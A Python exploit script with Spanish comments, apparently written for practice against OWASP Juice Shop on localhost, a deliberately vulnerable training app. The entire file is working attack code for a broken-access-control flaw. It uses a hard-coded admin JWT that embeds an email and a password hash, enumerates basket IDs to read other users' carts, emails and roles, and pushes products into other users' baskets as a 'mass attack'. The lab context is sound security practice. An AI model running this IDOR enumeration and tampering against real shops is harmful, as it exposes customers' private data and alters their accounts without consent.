#!/usr/bin/env python3
"""
Broken Access Control Exploit - Con Token de Administrador
"""

import requests
import json
import time
from urllib.parse import urljoin

class AdminBasketExploit:
    def __init__(self, target_url="http://localhost:3000", admin_token=None):
        self.target_url = target_url
        self.session = requests.Session()
        
        if admin_token:
            self.session.headers.update({
                'Authorization': f'Bearer {admin_token}',
                'Content-Type': 'application/json'
            })
            print("[+] Token de administrador configurado")
    
    def get_my_basket_id(self):
        """Obtener el ID del carrito del usuario actual"""
        try:
            response = self.session.get(urljoin(self.target_url, '/rest/basket/'))
            if response.status_code == 200:
                basket_data = response.json()
                return basket_data.get('data', {}).get('id')
        except Exception as e:
            print(f"[-] Error obteniendo carrito propio: {e}")
        return None
    
    def enumerate_all_baskets(self, max_id=50):
        """Enumerar TODOS los carritos del sistema"""
        print(f"\n[ğŸ¯] ENUMERANDO TODOS LOS CARRITOS (1-{max_id})...")
        
        accessible_baskets = []
        user_baskets = {}
        
        for basket_id in range(1, max_id + 1):
            try:
                response = self.session.get(
                    urljoin(self.target_url, f'/rest/basket/{basket_id}')
                )
                
                if response.status_code == 200:
                    basket_data = response.json()
                    products = basket_data.get('data', {}).get('Products', [])
                    total_value = sum(float(p.get('price', 0)) for p in products)
                    
                    # Extraer informaciÃ³n del usuario dueÃ±o del carrito
                    user_info = "Desconocido"
                    if 'data' in basket_data and 'User' in basket_data['data']:
                        user_data = basket_data['data']['User']
                        user_email = user_data.get('email', 'Desconocido')
                        user_role = user_data.get('role', 'customer')
                        user_info = f"{user_email} ({user_role})"
                    
                    print(f"  âœ… Carrito {basket_id} - Usuario: {user_info}")
                    print(f"     Productos: {len(products)} - Valor: ${total_value:.2f}")
                    
                    # Mostrar productos
                    for product in products[:3]:
                        print(f"     - {product.get('name', 'Unknown')} (${product.get('price', '0')})")
                    
                    if len(products) > 3:
                        print(f"     ... y {len(products) - 3} mÃ¡s")
                    
                    accessible_baskets.append({
                        'id': basket_id,
                        'user': user_info,
                        'product_count': len(products),
                        'total_value': total_value,
                        'data': basket_data
                    })
                    
                elif response.status_code == 404:
                    print(f"  âŒ Carrito {basket_id} - No existe")
                else:
                    print(f"  â“ Carrito {basket_id} - CÃ³digo: {response.status_code}")
                    
            except Exception as e:
                print(f"  [!] Error carrito {basket_id}: {e}")
        
        print(f"\n[+] RESUMEN: {len(accessible_baskets)} carritos accesibles encontrados")
        return accessible_baskets
    
    def add_items_to_basket(self, target_basket_id, product_list):
        """AÃ±adir mÃºltiples items a un carrito especÃ­fico"""
        print(f"\n[ğŸ›’] AÃ‘ADIENDO PRODUCTOS AL CARRITO {target_basket_id}...")
        
        success_count = 0
        for product in product_list:
            payload = {
                "ProductId": product["id"],
                "BasketId": str(target_basket_id),
                "quantity": product["quantity"]
            }
            
            try:
                response = self.session.post(
                    urljoin(self.target_url, '/api/BasketItems/'),
                    json=payload
                )
                
                if response.status_code in [200, 201]:
                    print(f"  âœ… AÃ±adidos {product['quantity']} {product['name']}")
                    success_count += 1
                else:
                    print(f"  âŒ Error con {product['name']}: {response.status_code}")
                    
            except Exception as e:
                print(f"  [!] Error: {e}")
        
        return success_count
    
    def demonstrate_privacy_violation(self):
        """Demostrar violaciÃ³n de privacidad masiva"""
        print("\n[ğŸ”“] DEMOSTRACIÃ“N: VIOLACIÃ“N DE PRIVACIDAD MASIVA")
        
        # Productos comunes para el ataque
        attack_products = [
            {"id": 1, "name": "Apple Juice", "quantity": 10},
            {"id": 2, "name": "Orange Juice", "quantity": 5},
            {"id": 3, "name": "Melon Basket", "quantity": 2}
        ]
        
        # Enumerar carritos primero
        baskets = self.enumerate_all_baskets(20)
        
        if baskets:
            print(f"\n[ğŸ’¥] REALIZANDO ATAQUE MASIVO...")
            
            for basket in baskets[:3]:  # Atacar primeros 3 carritos
                basket_id = basket['id']
                user_info = basket['user']
                
                print(f"\n  ğŸ¯ Atacando carrito {basket_id} ({user_info})...")
                
                success = self.add_items_to_basket(basket_id, attack_products)
                
                if success > 0:
                    print(f"  ğŸ’£ ATAQUE EXITOSO: {success} productos aÃ±adidos al carrito de {user_info}")
        
        print(f"\n[ğŸ¯] DEMOSTRACIÃ“N COMPLETADA: Broken Access Control verificado")
    
    def extract_sensitive_basket_data(self):
        """Extraer datos sensibles de todos los carritos"""
        print("\n[ğŸ“Š] EXTRACCIÃ“N DE DATOS SENSIBLES...")
        
        baskets = self.enumerate_all_baskets(30)
        
        if baskets:
            print(f"\n[ğŸ“ˆ] ANÃLISIS DE DATOS:")
            print(f"    Total de carritos: {len(baskets)}")
            
            total_products = sum(b['product_count'] for b in baskets)
            total_value = sum(b['total_value'] for b in baskets)
            
            print(f"    Total de productos en carritos: {total_products}")
            print(f"    Valor total en carritos: ${total_value:.2f}")
            
            # Encontrar carritos mÃ¡s valiosos
            valuable_baskets = sorted(baskets, key=lambda x: x['total_value'], reverse=True)[:3]
            
            print(f"\n[ğŸ’°] CARRITOS MÃS VALIOSOS:")
            for basket in valuable_baskets:
                print(f"    Carrito {basket['id']}: ${basket['total_value']:.2f} - {basket['user']}")
            
            # Buscar usuarios administradores
            admin_baskets = [b for b in baskets if 'admin' in b['user'].lower()]
            if admin_baskets:
                print(f"\n[ğŸ‘‘] CARRITOS DE ADMINISTRADORES:")
                for basket in admin_baskets:
                    print(f"    {basket['user']} - Carrito {basket['id']}")

def main():
    # Tu token de administrador
    ADMIN_TOKEN = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjUtMTEtMjMgMTc6Mzk6MjguNDAwICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjUtMTEtMjMgMTc6Mzk6MjguNDAwICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc2MzkxOTY4NX0.jcI3V4J9IfSh4eHMrAncWgJn4cZQxbKX30PubzJAgXCEZFccepziSKjIxvpQOMSJqr52pnW78koh041OakkyZIAoe5yCDYXTlipI6K3fbipGmAV-bRMRm1puo9fUbScfTzUJPDjddDJpJxJmOE50cyAyk7CP1GyyOKcbHfO26t4"
    
    print("""
    â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
    â•‘     BROKEN ACCESS CONTROL EXPLOIT - ADMIN     â•‘
    â•‘         OWASP Juice Shop - Baskets            â•‘
    â•‘                                               â•‘
    â•‘        A01:2021-Broken Access Control         â•‘
    â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    """)
    
    exploit = AdminBasketExploit("http://localhost:3000", ADMIN_TOKEN)
    
    # Ejecutar explotaciÃ³n completa
    exploit.demonstrate_privacy_violation()
    
    # Extraer datos sensibles
    exploit.extract_sensitive_basket_data()
    
    print(f"\n{'='*60}")
    print("[ğŸ¯] EXPLOIT COMPLETADO EXITOSAMENTE")
    print("[ğŸ’¡] Vulnerabilidad: Broken Access Control confirmada")
    print("[ğŸš¨] Impacto: ALTO - ExposiciÃ³n y modificaciÃ³n de datos de usuarios")
    print(f"{'='*60}")

if __name__ == "__main__":
    main()
